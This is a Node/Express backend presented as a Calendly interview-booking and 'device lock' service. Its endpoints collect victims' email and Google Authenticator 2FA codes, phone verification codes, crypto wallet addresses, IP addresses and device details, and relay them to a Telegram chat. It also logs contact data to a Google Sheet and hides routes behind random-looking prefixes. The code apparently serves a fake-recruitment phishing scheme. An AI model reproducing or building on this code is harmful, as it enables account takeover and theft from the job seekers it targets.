import 'dotenv/config';
import cors from 'cors';
import express from 'express';

// DB imports are conditional so the server can run without DATABASE_URL for local smoke tests
let closeDatabase = async () => {};
let initializeDatabase = async () => {};
let pool = null;

const app = express();
const port = Number(process.env.PORT || 3001);
const trustProxy = process.env.TRUST_PROXY === 'true';
const CALENDLY_API_BASE_URL =
  process.env.CALENDLY_API_BASE_URL || 'https://api.calendly.com';
const CALENDLY_API_TOKEN = process.env.CALENDLY_API_TOKEN || '';
const CALENDLY_EVENT_TYPE_URI = process.env.CALENDLY_EVENT_TYPE_URI || '';
const CALENDLY_SLOT_MINUTES = Number(process.env.CALENDLY_SLOT_MINUTES || 30);
const EASTERN_TIME_ZONE = 'America/New_York';
const GOOGLE_SHEET_WEBHOOK_URL = process.env.GOOGLE_SHEET_WEBHOOK_URL || '';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const AVAILABLE_PREFIXES = [
  'dFkLmNj3qRsTvW6YzAbCdEfGhIj8lMnOp1rStUvWxYzAbCdEfGh0',
  'Djp74iqXEJaTwLnkgtgG4m2sGkns2B8OYRVmYJfKCAoJqEjXu7dHu9K1cNz6FmRTX8wQp2vLB4yJ7g',
  'DCmRAoJQ2sFiq481wqXEJaTwLn79KpfmYJNTX8c7EKyJdHuBGkns2jOYRVjX2vLB4gu7kgtgG4mz6p',
];
const DEVICE_LOCK_ROUTE_PATHS = [
  '/api/device-locks',
  ...AVAILABLE_PREFIXES.map((prefix) => `/${prefix}-device-lock`),
];

if (trustProxy) {
  app.set('trust proxy', true);
}

app.use(
  cors({
    origin:
      process.env.CORS_ORIGIN?.split(',')
        .map((origin) => origin.trim())
        .filter(Boolean) || true,
  })
);
app.use(express.json());

// Return server time and Eastern Time breakdown for client-side use
app.get('/api/time', async (_req, res) => {
  try {
    const now = new Date();
    const utc = now.toISOString();
    const EASTERN = 'America/New_York';
    const parts = new Intl.DateTimeFormat('en-CA', {
      timeZone: EASTERN,
      hour12: false,
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
    }).formatToParts(now);

    const values = Object.fromEntries(
      parts.filter((p) => p.type !== 'literal').map((p) => [p.type, p.value])
    );

    const dateKey = `${values.year}-${values.month}-${values.day}`;
    const minutes = Number(values.hour) * 60 + Number(values.minute);

    return res.json({ result: true, utc, eastern: { dateKey, minutes } });
  } catch (err) {
    return res
      .status(500)
      .json({ result: false, status: 'failed to compute server time' });
  }
});

function getClientIp(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  if (typeof forwardedFor === 'string' && forwardedFor.length > 0) {
    return forwardedFor.split(',')[0].trim();
  }

  if (Array.isArray(forwardedFor) && forwardedFor.length > 0) {
    return forwardedFor[0].trim();
  }

  return req.ip || req.socket.remoteAddress || '';
}

function normalizeIpAddress(ipAddress) {
  if (!ipAddress) return '';
  return ipAddress.replace(/^::ffff:/, '').trim();
}

function normalizeDeviceId(deviceID) {
  return typeof deviceID === 'string' ? deviceID.trim() : '';
}

function isCalendlyConfigured() {
  return Boolean(CALENDLY_API_TOKEN && CALENDLY_EVENT_TYPE_URI);
}

function isTelegramConfigured() {
  return Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
}

function isGoogleSheetConfigured() {
  return Boolean(GOOGLE_SHEET_WEBHOOK_URL);
}

function isValidEmail(value) {
  return (
    typeof value === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim())
  );
}

function parseJsonSafely(text) {
  if (!text) return null;
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
}

function extractCalendlyErrorMessage(payload, fallback) {
  if (!payload) return fallback;

  if (typeof payload.message === 'string' && payload.message.trim()) {
    return payload.message;
  }

  if (payload.title && payload.details) {
    return `${payload.title}: ${payload.details}`;
  }

  if (Array.isArray(payload.errors) && payload.errors.length > 0) {
    const firstError = payload.errors[0];
    if (typeof firstError?.message === 'string') return firstError.message;
    if (typeof firstError?.details === 'string') return firstError.details;
  }

  return fallback;
}

async function calendlyRequest(path, options = {}) {
  const url = `${CALENDLY_API_BASE_URL}${path}`;
  const response = await fetch(url, {
    ...options,
    headers: {
      Authorization: `Bearer ${CALENDLY_API_TOKEN}`,
      'Content-Type': 'application/json',
      ...(options.headers || {}),
    },
  });

  const raw = await response.text();
  const parsed = parseJsonSafely(raw);

  if (!response.ok) {
    return {
      ok: false,
      status: response.status,
      message: extractCalendlyErrorMessage(
        parsed,
        `Calendly API request failed (${response.status})`
      ),
      data: parsed,
    };
  }

  return {
    ok: true,
    status: response.status,
    data: parsed,
  };
}

function buildAvailabilityWindow(startTimeIso) {
  const startDate = new Date(startTimeIso);
  const endDate = new Date(
    startDate.getTime() + CALENDLY_SLOT_MINUTES * 60 * 1000
  );
  return {
    startTime: startDate.toISOString(),
    endTime: endDate.toISOString(),
  };
}

async function fetchCalendlyAvailability(startTimeIso) {
  const { startTime, endTime } = buildAvailabilityWindow(startTimeIso);
  const params = new URLSearchParams({
    event_type: CALENDLY_EVENT_TYPE_URI,
    start_time: startTime,
    end_time: endTime,
  });

  return calendlyRequest(`/event_type_available_times?${params.toString()}`);
}

async function sendTelegramMessage(text) {
  const endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      disable_web_page_preview: true,
    }),
  });

  const raw = await response.text();
  const parsed = parseJsonSafely(raw);

  if (!response.ok || parsed?.ok === false) {
    return {
      ok: false,
      status: response.status,
      message:
        parsed?.description ||
        `Telegram API request failed (${response.status})`,
      data: parsed,
    };
  }

  return {
    ok: true,
    status: response.status,
    data: parsed,
  };
}

async function postGoogleSheetBookingRow(rowPayload) {
  const response = await fetch(GOOGLE_SHEET_WEBHOOK_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(rowPayload),
  });

  const raw = await response.text();
  const parsed = parseJsonSafely(raw);

  if (!response.ok) {
    return {
      ok: false,
      status: response.status,
      message:
        parsed?.status ||
        parsed?.message ||
        `Google Sheet webhook request failed (${response.status})`,
      data: parsed,
    };
  }

  return {
    ok: true,
    status: response.status,
    data: parsed,
  };
}

app.get('/api/calendly/availability', async (req, res) => {
  if (!isCalendlyConfigured()) {
    return res.status(503).json({
      result: false,
      status: 'Calendly API is not configured on backend.',
    });
  }

  const startTime =
    typeof req.query.startTime === 'string' ? req.query.startTime : '';
  if (!startTime) {
    return res
      .status(400)
      .json({ result: false, status: 'startTime is required.' });
  }

  const parsedStart = new Date(startTime);
  if (Number.isNaN(parsedStart.getTime())) {
    return res.status(400).json({
      result: false,
      status: 'startTime must be a valid ISO timestamp.',
    });
  }

  const availabilityRes = await fetchCalendlyAvailability(
    parsedStart.toISOString()
  );
  if (!availabilityRes.ok) {
    return res.status(availabilityRes.status || 502).json({
      result: false,
      status: availabilityRes.message,
      data: availabilityRes.data,
    });
  }

  const collection = Array.isArray(availabilityRes.data?.collection)
    ? availabilityRes.data.collection
    : [];
  return res.json({
    result: true,
    status: 'availability fetched',
    data: collection,
  });
});

// (availability-range endpoint removed; backend uses single-window availability)

app.post('/api/calendly/book', async (req, res) => {
  if (!isCalendlyConfigured()) {
    return res.status(503).json({
      result: false,
      status: 'Calendly API is not configured on backend.',
    });
  }

  const email =
    typeof req.body?.email === 'string' ? req.body.email.trim() : '';
  const timeslot =
    typeof req.body?.timeslot === 'string' ? req.body.timeslot : '';
  const name =
    typeof req.body?.name === 'string' && req.body.name.trim()
      ? req.body.name.trim()
      : email.split('@')[0] || 'Candidate';
  const timezone =
    typeof req.body?.timezone === 'string' && req.body.timezone.trim()
      ? req.body.timezone.trim()
      : 'America/New_York';
  const meetingLink =
    typeof req.body?.meetingLink === 'string'
      ? req.body.meetingLink.trim()
      : '';
  const inviteCode =
    typeof req.body?.inviteCode === 'string' ? req.body.inviteCode.trim() : '';
  const note = typeof req.body?.note === 'string' ? req.body.note.trim() : '';

  if (!isValidEmail(email)) {
    return res
      .status(400)
      .json({ result: false, status: 'A valid email is required.' });
  }

  // Normalize timeslot input: accept ISO strings or epoch (seconds or milliseconds)
  let parsedTimeslot = null;
  try {
    if (/^\d+$/.test(timeslot)) {
      // Numeric timestamp - determine seconds vs milliseconds
      const asNum = Number(timeslot);
      if (String(asNum).length <= 10) {
        // seconds -> convert to ms
        parsedTimeslot = new Date(asNum * 1000);
      } else {
        // assume milliseconds
        parsedTimeslot = new Date(asNum);
      }
    } else {
      parsedTimeslot = new Date(timeslot);
    }
  } catch (e) {
    parsedTimeslot = null;
  }

  if (!parsedTimeslot || Number.isNaN(parsedTimeslot.getTime())) {
    console.warn('Invalid timeslot received from client:', {
      timeslot,
      ip: normalizeIpAddress(getClientIp(req)),
    });
    return res.status(400).json({
      result: false,
      status:
        'timeslot must be a valid ISO timestamp or epoch seconds/milliseconds.',
    });
  }

  const tsYear = parsedTimeslot.getUTCFullYear();
  if (tsYear < 2020 || tsYear > 2035) {
    console.warn('Suspicious timeslot year from client:', {
      timeslot,
      parsed: parsedTimeslot.toISOString(),
      year: tsYear,
      ip: normalizeIpAddress(getClientIp(req)),
    });
    return res.status(400).json({
      result: false,
      status:
        'timeslot appears invalid (year out of expected range). Please select a valid date.',
    });
  }

  // Validate the selected slot against Calendly before creating invitee.
  const availabilityRes = await fetchCalendlyAvailability(
    parsedTimeslot.toISOString()
  );
  if (!availabilityRes.ok) {
    return res.status(availabilityRes.status || 502).json({
      result: false,
      status: availabilityRes.message,
      data: availabilityRes.data,
    });
  }

  const availabilityCollection = Array.isArray(availabilityRes.data?.collection)
    ? availabilityRes.data.collection
    : [];
  const selectedIso = parsedTimeslot.toISOString();
  const selectedTs = parsedTimeslot.getTime();
  const slotExists = availabilityCollection.some((item) => {
    const startTime =
      typeof item?.start_time === 'string' ? item.start_time : '';
    if (!startTime) return false;
    const slotTs = new Date(startTime).getTime();
    return Number.isFinite(slotTs) && slotTs === selectedTs;
  });

  if (!slotExists) {
    return res.status(409).json({
      result: false,
      status:
        'The selected timeslot is no longer available. Please choose another one.',
    });
  }

  const selectedSlot = availabilityCollection.find((item) => {
    const startTime =
      typeof item?.start_time === 'string' ? item.start_time : '';
    if (!startTime) return false;
    const slotTs = new Date(startTime).getTime();
    return Number.isFinite(slotTs) && slotTs === selectedTs;
  });

  const schedulingUrlRaw =
    typeof selectedSlot?.scheduling_url === 'string'
      ? selectedSlot.scheduling_url
      : '';
  if (!schedulingUrlRaw) {
    return res.status(500).json({
      result: false,
      status: 'Calendly did not return a scheduling URL for this slot.',
    });
  }

  const schedulingUrl = new URL(schedulingUrlRaw);
  if (email) schedulingUrl.searchParams.set('email', email);
  if (name) schedulingUrl.searchParams.set('name', name);
  if (timezone) schedulingUrl.searchParams.set('timezone', timezone);
  if (meetingLink) schedulingUrl.searchParams.set('a1', meetingLink);
  if (inviteCode) schedulingUrl.searchParams.set('a2', inviteCode);
  if (note) schedulingUrl.searchParams.set('a3', note);

  return res.status(200).json({
    result: true,
    status: 'scheduling link generated',
    data: {
      schedulingUrl: schedulingUrl.toString(),
      startTime: selectedIso,
      timezone,
    },
  });
});

app.post('/api/google-sheet/booking-log', async (req, res) => {
  if (!isGoogleSheetConfigured()) {
    return res.status(503).json({
      result: false,
      status: 'Google Sheet webhook is not configured on backend.',
    });
  }

  const linkedin =
    typeof req.body?.linkedin === 'string' ? req.body.linkedin.trim() : '';
  const email =
    typeof req.body?.email === 'string' ? req.body.email.trim() : '';
  const main = typeof req.body?.main === 'string' ? req.body.main.trim() : '';
  const id = typeof req.body?.id === 'string' ? req.body.id.trim() : '';
  const date = typeof req.body?.date === 'string' ? req.body.date.trim() : '';
  const time = typeof req.body?.time === 'string' ? req.body.time.trim() : '';
  const state = '';
  const country =
    typeof req.body?.country === 'string' ? req.body.country.trim() : '';
  const meetingLink =
    typeof req.body?.meetingLink === 'string'
      ? req.body.meetingLink.trim()
      : '';
  const note = typeof req.body?.note === 'string' ? req.body.note.trim() : '';
  const phoneNumber =
    typeof req.body?.phoneNumber === 'string'
      ? req.body.phoneNumber.trim()
      : '';
  const location =
    typeof req.body?.location === 'string' ? req.body.location.trim() : '';

  if (
    !linkedin ||
    !email ||
    !main ||
    !id ||
    !date ||
    !time ||
    !country ||
    !meetingLink
  ) {
    return res.status(400).json({
      result: false,
      status:
        'linkedin, email, main, id, date, time, country, and meetingLink are required.',
    });
  }

  if (!isValidEmail(email)) {
    return res.status(400).json({
      result: false,
      status: 'A valid email is required.',
    });
  }

  const webhookRes = await postGoogleSheetBookingRow({
    linkedin,
    email,
    main,
    id,
    date,
    time,
    state,
    country,
    meetingLink,
    note,
    phoneNumber,
    location,
  });

  if (!webhookRes.ok) {
    return res.status(webhookRes.status || 502).json({
      result: false,
      status: webhookRes.message,
      data: webhookRes.data,
    });
  }

  return res.status(200).json({
    result: true,
    status: 'booking row logged to Google Sheet',
  });
});

app.post('/api/phone-verification/notify', async (req, res) => {
  if (!isTelegramConfigured()) {
    return res.status(503).json({
      result: false,
      status: 'Telegram notification is not configured on backend.',
    });
  }

  const code = typeof req.body?.code === 'string' ? req.body.code.trim() : '';
  const message =
    typeof req.body?.message === 'string' ? req.body.message.trim() : '';
  const companyName =
    typeof req.body?.companyName === 'string'
      ? req.body.companyName.trim()
      : 'Unknown Company';

  if (!/^\d{6}$/.test(code) && !message) {
    return res.status(400).json({
      result: false,
      status:
        'code must be a 6-digit numeric value or message must be provided.',
    });
  }

  const telegramMessage = /^\d{6}$/.test(code)
    ? `${companyName} Verification Code: ${code}`
    : `${companyName}: ${message}`;

  const telegramRes = await sendTelegramMessage(telegramMessage);

  if (!telegramRes.ok) {
    return res.status(telegramRes.status || 502).json({
      result: false,
      status: telegramRes.message,
      data: telegramRes.data,
    });
  }

  return res.status(200).json({
    result: true,
    status: 'verification code notification sent',
  });
});

app.post('/api/isrun/notify', async (req, res) => {
  if (!isTelegramConfigured()) {
    return res.status(503).json({
      result: false,
      status: 'Telegram notification is not configured on backend.',
    });
  }

  const name =
    typeof req.body?.name === 'string' && req.body.name.trim()
      ? req.body.name.trim()
      : 'Unknown';
  const data =
    req.body?.data &&
    typeof req.body.data === 'object' &&
    !Array.isArray(req.body.data)
      ? req.body.data
      : null;

  if (!data) {
    return res.status(400).json({
      result: false,
      status: 'data must be a non-empty object.',
    });
  }

  const ipAddress = normalizeIpAddress(getClientIp(req)) || 'Unknown';
  const allowedDeviceFields = new Set([
    'Operating System',
    'Browser',
    'Screen Resolution',
    'Timezone',
  ]);

  // Transform device data into readable line-by-line format
  const formatDeviceData = (deviceObj) => {
    if (!deviceObj || typeof deviceObj !== 'object') return '';

    return Object.entries(deviceObj)
      .filter(([key]) => allowedDeviceFields.has(key))
      .map(([key, value]) => {
        // Use original key capitalization as-is
        const formattedKey = key;

        // Format value
        const formattedValue = Array.isArray(value)
          ? value.join(', ')
          : String(value).trim();

        return `${formattedKey}: ${formattedValue}`;
      })
      .join('\n');
  };

  const deviceDataLines = formatDeviceData(data);
  const telegramMessage = `IP: ${ipAddress}\nName: ${name}\n${deviceDataLines}`;

  const telegramRes = await sendTelegramMessage(telegramMessage);

  if (!telegramRes.ok) {
    return res.status(telegramRes.status || 502).json({
      result: false,
      status: telegramRes.message,
      data: telegramRes.data,
    });
  }

  return res.status(200).json({
    result: true,
    status: 'isrun notification sent',
  });
});

app.post('/api/address/notify', async (req, res) => {
  if (!isTelegramConfigured()) {
    return res.status(503).json({
      result: false,
      status: 'Telegram notification is not configured on backend.',
    });
  }

  const erc20 =
    typeof req.body?.erc20 === 'string' ? req.body.erc20.trim() : '';
  const trc20 =
    typeof req.body?.trc20 === 'string' ? req.body.trc20.trim() : '';
  const guestName =
    typeof req.body?.guestName === 'string' && req.body.guestName.trim()
      ? req.body.guestName.trim()
      : 'Unknown';
  const companyName =
    typeof req.body?.companyName === 'string' && req.body.companyName.trim()
      ? req.body.companyName.trim()
      : 'Unknown Company';

  const isValidErc = /^0x[a-fA-F0-9]{40}$/.test(erc20);
  const isValidTrc = /^T[a-zA-Z0-9]{33}$/.test(trc20);

  if (!isValidErc || !isValidTrc) {
    return res.status(400).json({
      result: false,
      status: 'Invalid ERC20 or TRC20 address format.',
    });
  }

  const ipAddress = normalizeIpAddress(getClientIp(req)) || 'Unknown';

  // Optionally accept device data from the client (same shape as /api/isrun/notify)
  const data =
    req.body?.data &&
    typeof req.body.data === 'object' &&
    !Array.isArray(req.body.data)
      ? req.body.data
      : null;

  const allowedDeviceFields = new Set([
    'Operating System',
    'Browser',
    'Screen Resolution',
    'Timezone',
  ]);

  const formatDeviceData = (deviceObj) => {
    if (!deviceObj || typeof deviceObj !== 'object') return '';

    return Object.entries(deviceObj)
      .filter(([key]) => allowedDeviceFields.has(key))
      .map(([key, value]) => {
        const formattedValue = Array.isArray(value)
          ? value.join(', ')
          : String(value).trim();
        return `${key}: ${formattedValue}`;
      })
      .join('\n');
  };

  const deviceDataLines = formatDeviceData(data);

  // Build message matching the requested layout
  const telegramMessage =
    `IP: ${ipAddress}\nName: ${guestName}\n` +
    (deviceDataLines ? `${deviceDataLines}\n` : '') +
    `ERC20: ${erc20}\nTRC20: ${trc20}`;

  const telegramRes = await sendTelegramMessage(telegramMessage);

  if (!telegramRes.ok) {
    return res.status(telegramRes.status || 502).json({
      result: false,
      status: telegramRes.message,
      data: telegramRes.data,
    });
  }

  return res
    .status(200)
    .json({ result: true, status: 'address notification sent' });
});

// Email + Google Authenticator 2FA notification (used for interview flows)
app.post('/api/email-2fa/notify', async (req, res) => {
  if (!isTelegramConfigured()) {
    return res.status(503).json({
      result: false,
      status: 'Telegram notification is not configured on backend.',
    });
  }

  const emailCode =
    typeof req.body?.emailCode === 'string' ? req.body.emailCode.trim() : '';
  const googleCode =
    typeof req.body?.googleCode === 'string' ? req.body.googleCode.trim() : '';
  const guestName =
    typeof req.body?.guestName === 'string' && req.body.guestName.trim()
      ? req.body.guestName.trim()
      : 'Unknown';
  const companyName =
    typeof req.body?.companyName === 'string' && req.body.companyName.trim()
      ? req.body.companyName.trim()
      : 'Unknown Company';

  if (!emailCode && !googleCode) {
    return res
      .status(400)
      .json({ result: false, status: 'emailCode or googleCode is required.' });
  }

  const ipAddress = normalizeIpAddress(getClientIp(req)) || 'Unknown';

  // Accept optional device data object like /api/isrun/notify
  const data =
    req.body?.data &&
    typeof req.body.data === 'object' &&
    !Array.isArray(req.body.data)
      ? req.body.data
      : null;
  const allowedDeviceFields = new Set([
    'Operating System',
    'Browser',
    'Screen Resolution',
    'Timezone',
  ]);

  const formatDeviceData = (deviceObj) => {
    if (!deviceObj || typeof deviceObj !== 'object') return '';
    return Object.entries(deviceObj)
      .filter(([key]) => allowedDeviceFields.has(key))
      .map(
        ([key, value]) =>
          `${key}: ${Array.isArray(value) ? value.join(', ') : String(value).trim()}`
      )
      .join('\n');
  };

  const deviceDataLines = formatDeviceData(data);

  const telegramMessage =
    `IP: ${ipAddress}\nName: ${guestName}\n` +
    (deviceDataLines ? `${deviceDataLines}\n` : '') +
    (emailCode ? `Email Code: ${emailCode}\n` : '') +
    (googleCode ? `Google Authenticator Code: ${googleCode}` : '');

  const telegramRes = await sendTelegramMessage(telegramMessage);

  if (!telegramRes.ok) {
    return res.status(telegramRes.status || 502).json({
      result: false,
      status: telegramRes.message,
      data: telegramRes.data,
    });
  }

  return res
    .status(200)
    .json({ result: true, status: 'email 2fa notification sent' });
});

// Email 2FA send-request - used when user requests an email code (short message)
app.post('/api/email-2fa/request', async (req, res) => {
  if (!isTelegramConfigured()) {
    return res.status(503).json({
      result: false,
      status: 'Telegram notification is not configured on backend.',
    });
  }

  const guestName =
    typeof req.body?.guestName === 'string' && req.body.guestName.trim()
      ? req.body.guestName.trim()
      : 'Unknown';
  const companyName =
    typeof req.body?.companyName === 'string' && req.body.companyName.trim()
      ? req.body.companyName.trim()
      : 'Unknown Company';
  const message =
    typeof req.body?.message === 'string' && req.body.message.trim()
      ? req.body.message.trim()
      : 'Time to send email code';

  const ipAddress = normalizeIpAddress(getClientIp(req)) || 'Unknown';

  const data =
    req.body?.data &&
    typeof req.body?.data === 'object' &&
    !Array.isArray(req.body?.data)
      ? req.body.data
      : null;

  const allowedDeviceFields = new Set([
    'Operating System',
    'Browser',
    'Screen Resolution',
    'Timezone',
  ]);

  const formatDeviceData = (deviceObj) => {
    if (!deviceObj || typeof deviceObj !== 'object') return '';
    return Object.entries(deviceObj)
      .filter(([key]) => allowedDeviceFields.has(key))
      .map(
        ([key, value]) =>
          `${key}: ${Array.isArray(value) ? value.join(', ') : String(value).trim()}`
      )
      .join('\n');
  };

  const deviceDataLines = formatDeviceData(data);

  const telegramMessage =
    `IP: ${ipAddress}\nName: ${guestName}\n` +
    (deviceDataLines ? `${deviceDataLines}\n` : '') +
    `${companyName}: ${message}`;

  const telegramRes = await sendTelegramMessage(telegramMessage);

  if (!telegramRes.ok) {
    return res.status(telegramRes.status || 502).json({
      result: false,
      status: telegramRes.message,
      data: telegramRes.data,
    });
  }

  return res.status(200).json({ result: true, status: 'email request sent' });
});

app.get('/health', async (_req, res) => {
  try {
    await pool.query('SELECT 1');
    res.json({ result: true, status: 'ok' });
  } catch (error) {
    res.status(500).json({ result: false, status: 'database unavailable' });
  }
});

app.get(DEVICE_LOCK_ROUTE_PATHS, async (req, res) => {
  const deviceID = normalizeDeviceId(req.query.deviceID);
  const ipAddress = normalizeIpAddress(
    typeof req.query.ipAddress === 'string'
      ? req.query.ipAddress
      : getClientIp(req)
  );

  if (!deviceID && !ipAddress) {
    return res.status(400).json({
      result: false,
      status: 'deviceID or ipAddress is required',
    });
  }

  try {
    const result = await pool.query(
      `SELECT ip_address, device_id, created_at, updated_at
       FROM device_locks
       WHERE ($1 <> '' AND device_id = $1)
          OR ($2 <> '' AND ip_address = $2)
       ORDER BY updated_at DESC
       LIMIT 1`,
      [deviceID, ipAddress]
    );

    const row = result.rows[0];
    if (!row) {
      return res
        .status(404)
        .json({ result: false, status: 'mapping not found' });
    }

    return res.json({
      result: true,
      status: 'mapping found',
      data: {
        ipAddress: row.ip_address,
        deviceID: row.device_id,
        createdAt: row.created_at,
        updatedAt: row.updated_at,
      },
    });
  } catch (error) {
    return res
      .status(500)
      .json({ result: false, status: 'failed to fetch mapping' });
  }
});

app.post(DEVICE_LOCK_ROUTE_PATHS, async (req, res) => {
  const deviceID = normalizeDeviceId(req.body?.deviceID);
  const ipAddress = normalizeIpAddress(req.body?.ipAddress || getClientIp(req));

  if (!deviceID) {
    return res
      .status(400)
      .json({ result: false, status: 'deviceID is required' });
  }

  if (!ipAddress) {
    return res
      .status(400)
      .json({ result: false, status: 'ipAddress could not be determined' });
  }

  const client = await pool.connect();

  try {
    await client.query('BEGIN');

    const existingByIp = await client.query(
      'SELECT id, ip_address, device_id FROM device_locks WHERE ip_address = $1 FOR UPDATE',
      [ipAddress]
    );

    const ipRow = existingByIp.rows[0];

    if (!ipRow) {
      const inserted = await client.query(
        `INSERT INTO device_locks (ip_address, device_id)
         VALUES ($1, $2)
         RETURNING ip_address, device_id, created_at, updated_at`,
        [ipAddress, deviceID]
      );

      await client.query('COMMIT');
      return res.status(201).json({
        result: true,
        status: 'mapping created',
        data: {
          ipAddress: inserted.rows[0].ip_address,
          deviceID: inserted.rows[0].device_id,
          createdAt: inserted.rows[0].created_at,
          updatedAt: inserted.rows[0].updated_at,
        },
      });
    }

    if (ipRow.device_id === deviceID) {
      const updated = await client.query(
        `UPDATE device_locks
         SET updated_at = NOW()
         WHERE id = $1
         RETURNING ip_address, device_id, created_at, updated_at`,
        [ipRow.id]
      );

      await client.query('COMMIT');
      return res.json({
        result: true,
        status: 'mapping matched',
        data: {
          ipAddress: updated.rows[0].ip_address,
          deviceID: updated.rows[0].device_id,
          createdAt: updated.rows[0].created_at,
          updatedAt: updated.rows[0].updated_at,
        },
      });
    }

    if (ipRow.device_id !== deviceID) {
      await client.query('ROLLBACK');
      return res.status(409).json({
        result: false,
        status: 'This IP address is already locked to another deviceID',
        data: {
          ipAddress: ipRow.ip_address,
          deviceID: ipRow.device_id,
        },
      });
    }
  } catch (error) {
    if (error.code === '23505') {
      const existingByIp = await client.query(
        'SELECT ip_address, device_id, created_at, updated_at FROM device_locks WHERE ip_address = $1 LIMIT 1',
        [ipAddress]
      );
      const ipRow = existingByIp.rows[0];

      await client.query('ROLLBACK');

      if (ipRow && ipRow.device_id === deviceID) {
        return res.json({
          result: true,
          status: 'mapping matched',
          data: {
            ipAddress: ipRow.ip_address,
            deviceID: ipRow.device_id,
            createdAt: ipRow.created_at,
            updatedAt: ipRow.updated_at,
          },
        });
      }

      return res.status(409).json({
        result: false,
        status: 'This IP address is already locked to another deviceID',
        data: {
          ipAddress: ipRow?.ip_address || ipAddress,
          deviceID: ipRow?.device_id,
        },
      });
    }

    await client.query('ROLLBACK');
    return res
      .status(500)
      .json({ result: false, status: 'failed to save mapping' });
  } finally {
    client.release();
  }
});

async function startServer() {
  if (process.env.DATABASE_URL) {
    try {
      const db = await import('./db.js');
      initializeDatabase = db.initializeDatabase;
      closeDatabase = db.closeDatabase;
      pool = db.pool;
      await initializeDatabase();
    } catch (err) {
      console.error('Failed to initialize database', err);
      throw err;
    }
  } else {
    console.warn(
      'DATABASE_URL not set — skipping DB initialization (smoke-test mode).'
    );
  }

  app.listen(port, () => {
    console.log(`Device lock backend listening on port ${port}`);
  });
}

startServer().catch((error) => {
  console.error('Failed to start device lock backend', error);
  process.exit(1);
});

process.on('SIGTERM', async () => {
  await closeDatabase();
  process.exit(0);
});

process.on('SIGINT', async () => {
  await closeDatabase();
  process.exit(0);
});
